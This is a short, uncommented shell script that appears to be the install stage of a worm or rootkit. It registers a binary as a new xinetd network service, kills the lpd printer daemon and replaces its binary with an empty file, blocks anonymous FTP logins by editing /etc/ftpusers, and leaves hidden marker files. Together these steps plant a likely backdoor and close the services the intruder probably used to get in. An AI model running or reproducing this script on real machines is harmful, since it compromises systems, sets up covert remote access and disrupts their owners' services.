#!/bin/sh
cp asp7 /usr/sbin/asp
cp asp /etc/xinetd.d
killall -USR1 xinetd

killall -9 lpd;rm -f /usr/sbin/lpd;touch /usr/sbin/lpd;
echo "ftp" >> /etc/ftpusers
echo "anonymous" >> /etc/ftpusers

touch .w
touch .l

